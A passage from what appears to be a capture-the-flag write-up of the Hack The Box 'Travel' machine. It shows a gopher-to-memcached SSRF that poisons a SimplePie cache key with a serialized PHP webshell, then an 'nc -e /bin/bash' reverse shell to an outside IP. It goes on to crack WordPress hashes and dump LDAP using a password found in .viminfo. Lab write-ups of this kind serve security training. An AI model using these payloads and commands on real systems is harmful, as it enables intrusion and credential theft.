+</span></span></code></pre></div><p>Once encoded in the gopher payload:</p><pre tabindex=0><code>gopher://LOCALHOST:11211/_%0d%0aset%20SpyD3r%204%200%20216%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:113:%22%3C%3Fphp%20if%28isset%28%24_REQUEST%5B%27cmd%27%5D%29%29%7B%20echo%20%22%3Cpre%3E%22%3B%20%24cmd%20%3D%20%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20system%28%24cmd%29%3B%20echo%20%22%3C/pre%3E%22%3B%20die%3B%20%7D%3F%3E%22%3B%7D%0d%0a
+</code></pre><p>But where are stored the templates?
+The theme is the default WordPress one, the css is located at
+<a href=http://blog.travel.htb/wp-content/themes/twentytwenty/style.css>http://blog.travel.htb/wp-content/themes/twentytwenty/style.css</a>
+so the templates will be here too, eg. <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/template.php>http://blog.travel.htb/wp-content/themes/twentytwenty/template.php</a></p><p>This mean that our webshell should be uploaded at <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php</a>
+so our paylaod was not executed.</p><p>I think it&rsquo;s due to <a href=https://www.php.net/manual/en/function.escapeshellarg.php>escapeshellarg</a> escaping
+the quotes.</p><p>PS: the debug feature can also be accessed directly <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php>http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</a></p><p>So let&rsquo;s try with a shell not using quotes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>system</span>($_GET[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><pre tabindex=0><code>$ php serialize.php 2&gt;/dev/null | tr -d &#39;\n&#39;
+O:14:&#34;TemplateHelper&#34;:2:{s:20:&#34;TemplateHelperfile&#34;;s:9:&#34;cyfun.php&#34;;s:20:&#34;TemplateHelperdata&#34;;s:26:&#34;&lt;?php system($_GET[1]); ?&gt;&#34;;}
+</code></pre><pre tabindex=0><code>gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20128%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</code></pre><p>Also Gopherus is hardcoding the key where it set the value to <code>SpyD3r</code> (this must be the reason why). But this
+key is never called so the deserialization is never triggered.</p><p>Let&rsquo;s get back to the line where the content is cached:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$simplepie<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>set_cache_location</span>(<span style=color:#e6db74>&#39;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#39;</span>);
+</span></span></code></pre></div><p>The caching is done by <a href=https://simplepie.org/>simplepie</a> with the function <a href=https://simplepie.org/wiki/reference/simplepie/set_cache_location>set_cache_location()</a>.
+We can also see there is a 60 second timeout so after that the cache may expire
+and the keys are prefixed with <code>xct_</code>.</p><p>If we search the <code>set_cache_location()</code> function on the source hosted on github
+we can see the function is calling the class method <code>cache_location</code>.</p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>	<span style=color:#e6db74>/**
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * Set the file system location where the cached files should be stored
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 *
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * @param string $location The file system location.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 */</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>set_cache_location</span>($location <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;./cache&#39;</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_location</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>) $location;
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></div><p>Searching for <code>cache_location</code> I saw that both class
+<code>SimplePie_Cache_Memcache</code> (<code>library/SimplePie/Cache/Memcache.php</code>) and
+<code>SimplePie_Cache_Memcached</code> (<code>/library/SimplePie/Cache/Memcached.php</code>) are
+implementing <code>SimplePie_Cache_Base</code> interface (<code>library/SimplePie/Cache/Base.php</code>).</p><p>Both are similar,
+<a href=https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99>https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#e6db74>/**
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * Create a new cache object
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * @param string $location Location string (from SimplePie::$cache_location)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * @param string $name     Unique ID for the cache
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * @param string $type     Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>     */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($location, $name, $type) {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;host&#39;</span>   <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;port&#39;</span>   <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>11211</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;extras&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;timeout&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3600</span>, <span style=color:#75715e>// one hour
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#e6db74>&#39;prefix&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;simplepie_&#39;</span>,
+</span></span><span style=display:flex><span>            ),
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>SimplePie_Misc</span><span style=color:#f92672>::</span><span style=color:#a6e22e>array_merge_recursive</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span>, <span style=color:#a6e22e>SimplePie_Cache</span><span style=color:#f92672>::</span><span style=color:#a6e22e>parse_URL</span>($location));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span>[<span style=color:#e6db74>&#39;extras&#39;</span>][<span style=color:#e6db74>&#39;prefix&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$name</span><span style=color:#e6db74>:</span><span style=color:#e6db74>$type</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Memcached</span>();
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addServer</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span>[<span style=color:#e6db74>&#39;host&#39;</span>], (<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>options</span>[<span style=color:#e6db74>&#39;port&#39;</span>]);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>The extra options timeout & prefix will be overriden by the ones we saw in
+the template. Then the key is the concatenation of
+the prefix <code>xct_</code> + the md5 of the name (unique id), colon & type (TYPE_FEED).
+In <code>library/SimplePie/Cache/Base.php</code> we can see that <code>TYPE_FEED = 'spc'</code>.</p><p>So we have something like that <code>xct_ + MD5( UNIQUE_ID? ":spc")</code> but we still need
+to determine how <code>UNIQUE_ID</code> is generated.</p><p>For that we have to look at the main class (in <code>library/SimplePie.php</code>) when
+SimplePie is initialized (<code>$simplepie->init();</code>).</p><p><code>set_cache_name_function</code></p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>	<span style=color:#e6db74>/**
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * Set callback function to create cache filename with
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 *
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * @param mixed $function Callback function
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 */</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>set_cache_name_function</span>($function <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;md5&#39;</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_callable</span>($function))
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_name_function</span> <span style=color:#f92672>=</span> $function;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>	<span style=color:#e6db74>/**
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * @var string Function that creates the cache filename
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * @see SimplePie::set_cache_name_function()
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 * @access private
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>	 */</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $cache_name_function <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;md5&#39;</span>;
+</span></span></code></pre></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>        $cache <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>registry</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>call</span>(<span style=color:#e6db74>&#39;Cache&#39;</span>, <span style=color:#e6db74>&#39;get_handler&#39;</span>, <span style=color:#66d9ef>array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_location</span>, <span style=color:#a6e22e>call_user_func</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_name_function</span>, $url), <span style=color:#e6db74>&#39;spc&#39;</span>));
+</span></span></code></pre></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>          $cache <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>registry</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>call</span>(<span style=color:#e6db74>&#39;Cache&#39;</span>, <span style=color:#e6db74>&#39;get_handler&#39;</span>, <span style=color:#66d9ef>array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_location</span>, <span style=color:#a6e22e>call_user_func</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_name_function</span>, $file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>url</span>), <span style=color:#e6db74>&#39;spc&#39;</span>));
+</span></span></code></pre></div><p>So what I called the <code>UNIQUE_ID</code> is generated like this <code>md5($url)</code>.</p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>				$url <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>feed_url</span> <span style=color:#f92672>.</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>force_feed</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;#force_feed&#39;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span></code></pre></div><p><code>$url</code> is the <code>feed_url</code>.</p><p><code>"xct_" + MD5( MD5(feed_url) + ":spc")</code></p><p>So now which URL do we want to poison? We are forced to make it in two steps.
+Because poisoning the URL we are attacking with is impossible as we need
+the hash of the URL but the URL contains the cache that is forged with the
+URL hash, so it&rsquo;s recursive.
+Else we have to poison an arbitrary URL that we can compute in advance.
+In the template code if no <code>custom_feed_url</code> is provided, the default one
+<a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a> is used instead.
+We can compute it like that:</p><pre tabindex=0><code>$ printf %s &#34;$(printf %s &#39;http://www.travel.htb/newsfeed/customfeed.xml&#39; | md5sum | cut -d &#39; &#39; -f 1):spc&#34; | md5sum | cut -d &#39; &#39; -f 1
+4e5612ba079c530a6b1f148c0b352241
+</code></pre><p>The cache key is <code>xct_4e5612ba079c530a6b1f148c0b352241</code>.</p><p>So now here is the two steps attack:</p><ol><li>Poison the cache with the with our gopher request</li><li>Call <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a> without custom feed to trigger the cache (within 60 seconds)</li></ol><p>That will result in our shell being written to the server.</p><p>We have to replace <code>SpyD3r</code> with <code>xct_4e5612ba079c530a6b1f148c0b352241</code>.</p><p>Also we have to understand the <a href=https://www.tutorialspoint.com/memcached/memcached_set_data.htm>Memcached - Set Data</a> structure</p><pre tabindex=0><code>set key flags exptime bytes [noreply]
+value
+</code></pre><p>By default gopherus set the following:</p><ul><li>flags: 4 (an arbitrary integer)</li><li>exptime: 0 (no expiration)</li><li>bytes: 128 (size in bytes of the data block)</li></ul><p>That seems good. Also earlier I was copy-pasting the serialized payload into gopherus
+so some unprintable characters were missing. The proper solution is to directly pipe
+the output into it.</p><pre tabindex=0><code>$ php serialize.php 2&gt;/dev/null | gopherus --exploit phpmemcache
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+This is usable when you know Class and Variable name used by user
+
+Give serialization payload
+example: O:5:&#34;Hello&#34;:0:{}   :
+Your gopher link is ready to do SSRF :
+
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20132%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22%00TemplateHelper%00file%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22%00TemplateHelper%00data%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+
+After everything done, you can delete memcached item by using this payload:
+
+gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
+
+-----------Made-by-SpyD3r-----------
+</code></pre><p>Then we just have to run the two steps.</p><pre tabindex=0><code>$ curl &#39;http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20132%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22%00TemplateHelper%00file%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22%00TemplateHelper%00data%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a&#39;
+
+$ curl http://blog.travel.htb/awesome-rss/
+</code></pre><p>And <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php</a> is
+available.</p><p>Then we have 60 seconds to do something like getting a reverse shell, eg.</p><p><a href="http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999">http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999</a></p><pre tabindex=0><code>$ pwncat -l 9999 -vv
+INFO: Listening on :::9999 (family 10/IPv6, TCP)
+INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
+INFO: Client connected from 10.10.10.189:47498 (family 2/IPv4, TCP)
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h2 id=privilege-escalation-of-machine--from-www-data-to-lynik-admin>Privilege Escalation of Machine : from www-data to lynik-admin<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-lynik-admin>#</a></h2><p>There is a SQL backup in the wordpress directory.</p><pre tabindex=0><code>$ ls -lhA /opt/wordpress
+total 1.2M
+-rw-r--r-- 1 root root 1.2M Apr 24 06:39 backup-13-04-2020.sql
+</code></pre><p>Let&rsquo;s look for the user creation:</p><pre tabindex=0><code>$ cat /opt/wordpress/backup-13-04-2020.sql | grep &#39;INSERT INTO `wp_users`&#39;
+INSERT INTO `wp_users` VALUES (1,&#39;admin&#39;,&#39;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#39;,&#39;admin&#39;,&#39;admin@travel.htb&#39;,&#39;http://localhost&#39;,&#39;2020-04-13 13:19:01&#39;,&#39;&#39;,0,&#39;admin&#39;),(2,&#39;lynik-admin&#39;,&#39;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#39;,&#39;lynik-admin&#39;,&#39;lynik@travel.htb&#39;,&#39;&#39;,&#39;2020-04-13 13:36:18&#39;,&#39;&#39;,0,&#39;Lynik Schmidt&#39;);
+</code></pre><p>Then we can run to find the hash type:</p><pre tabindex=0><code>$ haiti &#39;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#39;
+Wordpress ΓëÑ v2.6.2 [HC: 400] [JtR: phpass]
+Joomla ΓëÑ v2.5.18 [HC: 400] [JtR: phpass]
+PHPass&#39; Portable Hash [HC: 400] [JtR: phpass]
+</code></pre><p>Then let&rsquo;s start cracking with [john][jtr]:</p><pre tabindex=0><code>$ john --format=phpass hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+1stepcloser      (?)
+</code></pre><p><code>lynik-admin</code> / <code>1stepcloser</code></p><p>The we can log in via ssh:</p><pre tabindex=0><code>$ ssh lynik-admin@travel.htb
+lynik-admin@travel:~$ id
+uid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)
+</code></pre><h2 id=privilege-escalation-of-machine--from-lynik-admin-to-root>Privilege Escalation of Machine : from lynik-admin to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-lynik-admin-to-root>#</a></h2><pre tabindex=0><code>lynik-admin@travel:~$ ls -lhA
+total 32K
+lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 lynik-admin lynik-admin 3.7K Feb 25  2020 .bashrc
+drwx------ 2 lynik-admin lynik-admin 4.0K Apr 23 19:34 .cache
+drwx------ 4 lynik-admin lynik-admin 4.0K Sep  9 05:48 .gnupg
+-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
+-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile
+-r--r--r-- 1 root        root          33 Sep  9 04:56 user.txt
+-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
+</code></pre><p>We can see a <code>.viminfo</code> file and a <code>.ldaprc</code> file.</p><p>Some lines in <code>.viminfo</code> are interesting:</p><pre tabindex=0><code># Registers:
+&#34;&#34;1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,&#34;BINDPW Theroadlesstraveled&#34;
+
+# File marks:
+&#39;0  3  0  ~/.ldaprc
+|4,48,3,0,1587670530,&#34;~/.ldaprc&#34;
+
+# Jumplist (newest first):
+-&#39;  3  0  ~/.ldaprc
+|4,39,3,0,1587670530,&#34;~/.ldaprc&#34;
+-&#39;  1  0  ~/.ldaprc
+|4,39,1,0,1587670527,&#34;~/.ldaprc&#34;
+
+# History of marks within files (newest to oldest):
+
+&gt; ~/.ldaprc
+        *       1587670529      0
+        &#34;       3       0
+        .       4       0
+        +       4       0
+</code></pre><p>In the <code>.ldaprc</code> too:</p><pre tabindex=0><code>HOST ldap.travel.htb
+BASE dc=travel,dc=htb
+BINDDN cn=lynik-admin,dc=travel,dc=htb
+</code></pre><p>With the password and information we can make a request binding to the rootDN:</p><pre tabindex=0><code>$ ldapsearch -H ldap://ldap.travel.htb -x -D &#39;cn=lynik-admin,dc=travel,dc=htb&#39; -w Theroadlesstraveled
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=travel,dc=htb&gt; (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# travel.htb
+dn: dc=travel,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: Travel.HTB
+dc: travel
+
+# admin, travel.htb
+dn: cn=admin,dc=travel,dc=htb
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
+
+# servers, travel.htb
+dn: ou=servers,dc=travel,dc=htb
+description: Servers
+objectClass: organizationalUnit
+ou: servers
+
+# lynik-admin, travel.htb
+dn: cn=lynik-admin,dc=travel,dc=htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
+ =
+
+# workstations, travel.htb
+dn: ou=workstations,dc=travel,dc=htb
+description: Workstations
+objectClass: organizationalUnit
+ou: workstations
+
+# linux, servers, travel.htb
+dn: ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Servers
+objectClass: organizationalUnit
+ou: linux
+
+# windows, servers, travel.htb
+dn: ou=windows,ou=servers,dc=travel,dc=htb
+description: Windows Servers
+objectClass: organizationalUnit
+ou: windows
+
+# users, linux, servers, travel.htb
+dn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Users
+objectClass: organizationalUnit
+ou: users
+
+# groups, linux, servers, travel.htb
+dn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Groups
+objectClass: organizationalUnit
+ou: groups
+
+# jane, users, linux, servers, travel.htb
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: jane
+cn: Jane Rodriguez
+sn: Rodriguez
+givenName: Jane
+loginShell: /bin/bash
+uidNumber: 5005
+gidNumber: 5000
+homeDirectory: /home/jane
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# brian, users, linux, servers, travel.htb
+dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: brian
+cn: Brian Bell
+sn: Bell
+givenName: Brian
+loginShell: /bin/bash
+uidNumber: 5002
+gidNumber: 5000
+homeDirectory: /home/brian
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# frank, users, linux, servers, travel.htb
+dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: frank
+cn: Frank Stewart
+sn: Stewart
+givenName: Frank
+loginShell: /bin/bash
+uidNumber: 5001
+gidNumber: 5000
+homeDirectory: /home/frank
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# jerry, users, linux, servers, travel.htb
+dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: jerry
+uidNumber: 5006
+homeDirectory: /home/jerry
+givenName: Jerry
+gidNumber: 5000
+sn: Morgan
+cn: Jerry Morgan
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+# lynik, users, linux, servers, travel.htb
+dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: lynik
+uidNumber: 5000
+homeDirectory: /home/lynik
+givenName: Lynik
+gidNumber: 5000
+sn: Schmidt
+cn: Lynik Schmidt
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+# edward, users, linux, servers, travel.htb
+dn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: edward
+uidNumber: 5009
+homeDirectory: /home/edward
+givenName: Edward
+gidNumber: 5000
+sn: Roberts
+cn: Edward Roberts
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+# eugene, users, linux, servers, travel.htb
+dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: eugene
+cn: Eugene Scott
+sn: Scott
+givenName: Eugene
+loginShell: /bin/bash
+uidNumber: 5008
+gidNumber: 5000
+homeDirectory: /home/eugene
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# gloria, users, linux, servers, travel.htb
+dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: gloria
+uidNumber: 5010
+homeDirectory: /home/gloria
+givenName: Gloria
+gidNumber: 5000
